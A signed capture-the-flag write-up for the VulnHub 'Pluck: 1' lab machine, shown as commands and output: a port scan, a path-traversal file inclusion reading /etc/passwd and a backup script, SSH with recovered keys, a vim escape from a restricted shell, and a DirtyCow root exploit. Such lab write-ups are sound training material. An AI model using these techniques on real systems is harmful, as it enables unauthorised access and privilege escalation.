@@ -1,0 +1,217 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA512
+
+# $Id: ctf_pluck.txt,v 1.0 2017/03/13 19:16:55 dhn Exp $
+
+Writeup pluck: 1 [1]
+
+0x1) found the ports
+
+[dhn]::[~/dev/ctf/write_up/boot2root] export ip=192.168.178.43
+[dhn]::[~/dev/ctf/write_up/boot2root] nmap -T4 -A -p- $ip
+
+Starting Nmap 6.47 ( http://nmap.org  ) at 2017-03-13 21:16 CET
+Nmap scan report for pluck.fritz.box (192.168.178.43)
+Host is up (0.089s latency).
+Not shown: 65531 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     (protocol 2.0)
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-title: Pluck
+3306/tcp open  mysql   MySQL (unauthorized)
+5355/tcp open  unknown
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
+SF-Port22-TCP:V=6.47%I=7%D=3/13%Time=58C6FE3D%P=x86_64-pc-linux-gnu%r(NULL
+SF:,20,"SSH-2\.0-OpenSSH_7\.3p1\x20Ubuntu-1\r\n");
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 134.75 seconds
+
+0x2) open firefox and go to http://$ip
+
+0x3) LFI
+
+[dhn]::[~/dev/ctf/write_up/boot2root] curl -s http://$ip/index.php\?page\=../../../etc/passwd | egrep -e "([a-zA-Z])+:([a-zA-Z])+"
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+messagebus:x:106:109::/var/run/dbus:/bin/false
+mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
+lxd:x:108:65534::/var/lib/lxd/:/bin/false
+uuidd:x:109:114::/run/uuidd:/bin/false
+dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
+pollinate:x:112:1::/var/cache/pollinate:/bin/false
+bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
+Debian-exim:x:113:119::/var/spool/exim4:/bin/false
+peter:x:1001:1001:,,,:/home/peter:/bin/bash
+paul:x:1002:1002:,,,:/home/paul:/usr/bin/pdmenu
+backup-user:x:1003:1003:Just to make backups easier,,,:/backups:/usr/local/scripts/backup.sh
+
+# the backup-user looks interested ;)
+
+[dhn]::[~/dev/ctf/write_up/boot2root] curl -s http://$ip/index.php\?page\=../../../usr/local/scripts/backup.sh
+
+...
+#!/bin/bash
+
+########################
+# Server Backup script #
+########################
+
+#Backup directories in /backups so we can get it via tftp
+
+echo "Backing up data"
+tar -cf /backups/backup.tar /home /var/www/html > /dev/null 2& > /dev/null
+echo "Backup complete"
+...
+
+0x4) download backup.tar and extract
+
+[dhn]::[~/dev/ctf/write_up/boot2root] wget http://$ip/index.php\?page\=../../..//backups/backup.tar -O backup.tar
+....
+
+[dhn]::[~/dev/ctf/write_up/boot2root] tar xf backup.tar
+tar: This does not look like a tar archive
+tar: Skipping to next header
+tar: Skipping to next header
+tar: Skipping to next header
+tar: Skipping to next header
+tar: Skipping to next header
+tar: Skipping to next header
+tar: Skipping to next header
+tar: Skipping to next header
+tar: Skipping to next header
+tar: Skipping to next header
+tar: Skipping to next header
+tar: Skipping to next header
+tar: Skipping to next header
+tar: Skipping to next header
+tar: Skipping to next header
+tar: Skipping to next header
+tar: Skipping to next header
+tar: Skipping to next header
+tar: Skipping to next header
+tar: Skipping to next header
+tar: Skipping to next header
+tar: Skipping to next header
+tar: Skipping to next header
+tar: Skipping to next header
+tar: Skipping to next header
+tar: Skipping to next header
+tar: Skipping to next header
+tar: Skipping to next header
+tar: Skipping to next header
+tar: Skipping to next header
+tar: Skipping to next header
+tar: Skipping to next header
+tar: Skipping to next header
+tar: Skipping to next header
+tar: Exiting with failure status due to previous errors
+[dhn]::[~/dev/ctf/write_up/boot2root]
+
+0x5) use id_key* to connect to the $ip
+
+[dhn]::[~/dev/ctf/write_up/boot2root/home/paul/keys] chmod 600 id_key*
+[dhn]::[~/dev/ctf/write_up/boot2root/home/paul/keys] ls
+total 48K
+4.0K id_key1  4.0K id_key3  4.0K id_key5  4.0K id_key1.pub  4.0K id_key3.pub  4.0K id_key5.pub
+4.0K id_key2  4.0K id_key4  4.0K id_key6  4.0K id_key2.pub  4.0K id_key4.pub  4.0K id_key6.pub
+[dhn]::[~/dev/ctf/write_up/boot2root/home/paul/keys] ssh -i id_key4 paul@192.168.178.43
+The authenticity of host '192.168.178.43 (192.168.178.43)' can't be established.
+ECDSA key fingerprint is 8f:8c:ac:8d:e8:cc:f9:0e:89:f7:5d:a0:6c:28:56:fd.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '192.168.178.43' (ECDSA) to the list of known hosts.
+
+0x6) paul has the pdmenu as default shell, now let's escape ;)
+
+- -> Edit file -> vim: set shell=/bin/bash -> :shell (ENTER)
+
+paul@pluck:~$ id
+uid=1002(paul) gid=1002(paul) groups=1002(paul)
+
+0x7) privilege escalation - dirtycow
+
+paul@pluck:~$ gcc cowroot.c -o cowroot -pthread 2>/dev/null
+paul@pluck:~$ ./cowroot
+DirtyCow root privilege escalation
+Backing up /usr/bin/passwd.. to /tmp/bak
+Size of binary: 54256
+Racing, this may take a while..
+thread stopped
+/usr/bin/passwd is overwritten
+Popping root shell.
+Don't forget to restore /tmp/bak
+thread stopped
+root@pluck:/home/paul/#
+
+0x8) read the flag.txt
+
+root@pluck:/home/paul/# cd /root
+root@pluck:/root# ls
+flag.txt
+root@pluck:/root# cat flag.txt
+
+Congratulations you found the flag
+
+- ---------------------------------------
+
+######   ((((((((((((((((((((((((((((((
+#########   (((((((((((((((((((((((((((
+,,##########   ((((((((((((((((((((((((
+@@,,,##########   (((((((((((((((((((((
+@@@@@,,,##########                     
+@@@@@@@@,,,############################
+@@@@@@@@@@@,,,#########################
+@@@@@@@@@,,,###########################
+@@@@@@,,,##########                    
+@@@,,,##########   &&&&&&&&&&&&&&&&&&&&
+,,,##########   &&&&&&&&&&&&&&&&&&&&&&&
+##########   &&&&&&&&&&&&&&&&&&&&&&&&&&
+#######   &&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+root@pluck:/root#
+
+[1] https://www.vulnhub.com/entry/pluck-1,178/
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
+
+iQIcBAEBCgAGBQJYxw4+AAoJEKjdmUcmQRI8zRYQAJC7AQlZvSRkUsATnLbPEvFz
+BzirCNjV8UMDABvZtfpyA0DMd8FDvR2qyIGJpvqPhlp1TNX6hoqNaC+HWNlNcwng
+p+pMnliikUy6072lzkDtou2LZLKPMBGvsjCizQyOX1HOQsKGYCkeH2Ee6ttTqbgf
+AIcBDREaIyJ/26IZ8S3MOhPp6h9SKT46JAExTiq2fDbpwP7JUqL/bfOJtycH51uK
+QbNjM0c3zeQPqAxXpw0ASwqAgdm1DtyBdISEOIOK/u+j2VqFJHp/OExy24E8Ek1f
+/+gjeIiAx03vnVuzj1kqX2vRi5yO4EluB9bNf/v8/UoFspoLupMDda+DG0WV8u3T
+Bm6QcL7VdWmmGqWpU8O+RrHv408vu9urtJ9YcV9XKhlXY5BnL2zF5dz+9cPeOUGI
+r/PJIcr36nFeT32iIC1dWqQq8F455WZ02DozdwnjDfb6bntMmCzdslj56/+qOWhM
+3zEWT4FBko650uV7s0M0p3InWy3cYYgUMiQxxR/a+VOaB1rITThu5BjOBE782eoH
+kqRq7Z/+sKMK9pwFZyFep9C1C/NJqxyJhR2XUrDsxH2aQhK/Fw6eWYyNQ0Rx9QBc
+6dePWhbgoxLllyEVIBk/IWl9V7KMZTREzPsJi0Zy0vhesvAOIMpbh4nwOdQJNVSO
+M5RnlOEBVtUN8fuPf2O9
+=RZfP
+-----END PGP SIGNATURE-----
